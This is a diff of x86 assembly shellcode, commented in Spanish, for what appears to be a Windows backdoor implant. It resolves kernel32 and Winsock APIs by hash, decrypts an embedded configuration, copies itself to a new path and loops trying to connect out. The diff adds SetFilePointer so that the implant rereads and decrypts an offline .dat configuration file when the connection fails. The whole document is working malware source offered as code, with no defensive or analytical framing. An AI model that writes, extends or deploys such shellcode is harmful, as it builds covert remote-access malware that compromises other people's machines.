@@ -71,7 +71,7 @@ find_delta:
         *###############################################################################*/
 #pragma region hashes
 kernel32_symbol_hashes:
-        #define kernel32_count  12
+        #define kernel32_count  13
         API_DEFINE(LoadLibraryA, ('L') ('o') ('a') ('d') ('L') ('i') ('b') ('r') ('a') ('r') ('y') ('A'))
         API_DEFINE(GetProcAddress, ('G') ('e') ('t') ('P') ('r') ('o') ('c') ('A') ('d') ('d') ('r') ('e') ('s') ('s'))
         API_DEFINE(Sleep, ('S') ('l') ('e') ('e') ('p'))
@@ -84,6 +84,7 @@ kernel32_symbol_hashes:
         API_DEFINE(WinExec, ('W') ('i') ('n') ('E') ('x') ('e') ('c'))
         API_DEFINE(CreateFileA, ('C') ('r') ('e') ('a') ('t') ('e') ('F') ('i') ('l') ('e') ('A'))
         API_DEFINE(ReadFile, ('R') ('e') ('a') ('d') ('F') ('i') ('l') ('e'))
+        API_DEFINE(SetFilePointer, ('S') ('e') ('t') ('F') ('i') ('l') ('e') ('P') ('o') ('i') ('n') ('t') ('e') ('r'))
 
 ws2_32_symbol_hashes:
         #define ws2_32_count    7
@@ -196,10 +197,8 @@ to_start:
         **    Utilizaremos durante todo el código EBP como puntero al inicio de este
         **    'stack de direcciones'
         *###############################################################################*/
-        pushc(STACKSIZE)
-        pop  eax
-        sub  esp, eax 
-        lea  ebp, [esp+0x40]
+        add  esp, -(STACKSIZE)
+        lea  ebp, [esp+STACK_OFFSET]
 #ifdef SC_DELTA
         push edi                        //Guardamos el Delta
 #endif //SC_DELTA
@@ -258,11 +257,11 @@ find_kernel32_finished:
         movr(esi, kernel32_symbol_hashes)// Puntero al primer hash
         movr(edi, LoadFunctions)        // Puntero a LoadFunctions()
 
-        sub  ebp, 0x40                  //Apuntamos al inicio de Stack
+        sub  ebp, STACK_OFFSET          //Apuntamos al inicio de Stack
         //Cargamos las APIs de kernel32 en la pila a partir de los hashes
         push kernel32_count             //v Número de hashes de kernel32
         call edi                        //>LoadFunctions(kernel32_count);
-        mov  ebx, [ebp-(kernel32_count*4)+_LoadLibraryA+0x40]//EBX = &LoadLibraryA
+        mov  ebx, [ebp-(kernel32_count*4)+_LoadLibraryA+STACK_OFFSET]//EBX = &LoadLibraryA
 
         //Obtenemos la BaseAddress de ws2_32
         pushc('23')                     //v
@@ -293,7 +292,7 @@ find_kernel32_finished:
         pop  edi                        //Recuperamos el Delta
 #endif //SC_DELTA
         //Volvemos a apuntar al inicio del stack de APIs
-        sub  ebp, (kernel32_count+ws2_32_count+advapi32_count)*4 - 0x40
+        sub  ebp, (kernel32_count+ws2_32_count+advapi32_count)*4 - STACK_OFFSET
 
         //Creamos un buffer para almacenar la configuración cifrada y luego descifrarla.
         movr(esi, config_start)         //Cargamos la posición del inicio de la config
@@ -454,7 +453,7 @@ do_not_copy://(Somos la copia)
         mov  dl, '"'                    //v
         call copy_uni_to_ascii_filter   //> Pasamos de UNICODE a ASCII hasta encontrar una comilla
         //EDI apunta ahora al final de nuestra ruta.
-        mov  DWORD PTR[edi-4], 'tad.'   //Cambiamos la ruta
+        mov  DWORD PTR[edi-4], 'tad.'     //Cambiamos la extensión a .dat
 
         cdq                             //EDX = 0
         push edx                        //v
@@ -512,18 +511,29 @@ newSocket:
         jmp  connect_loop
 sleep_and_loop:
         cmp  DWORD PTR[ebp+_DAT_NFO], -1
-        je   do_the_loop
+        je   do_the_loop                //Si el fichero offline no existe seguimos intentado conectar
+        //Apuntamos al inicio del fichero
+        xor  edx, edx                   //EDX = 0
+        push edx                        //v(FILE_BEGIN = 0)
+        push edx                        //v
+        push edx                        //v
+        push [ebp+_DAT_NFO]             //v
+        call [ebp+_SetFilePointer]      //>SetFilePointer(hFile, 0, 0, FILE_BEGIN);
+        
+        //Leemos
         cdq                             //EDX = 0
         push edx                        //v
-        push edx                        //v
-        push esp                        //v
+        lea  edx, [ebp+_buffLen]        //v
+        push edx                        //> &buff_len
         xor  eax, eax                   //EAX = 0
         mov  ah, 0x50                   //EAX = BUFF_SIZE
         push eax                        //v
         push [ebp+_pBuff]               //v
         push [ebp+_DAT_NFO]             //v
-        call [ebp+_ReadFile]            //>ReadFile(hFile, &pBuff, 5000, &read, NULL)
-        pop  edx
+        call [ebp+_ReadFile]            //>ReadFile(hFile, &pBuff, 5000, &buff_len, NULL)
+        test eax, eax                   //EAX != 0?
+        jnz  init_decrypt               //Si no ha habido error al leer procedemos a descifrar
+
 do_the_loop:
 #ifdef SC_NULL
         push 0x7F                       //v
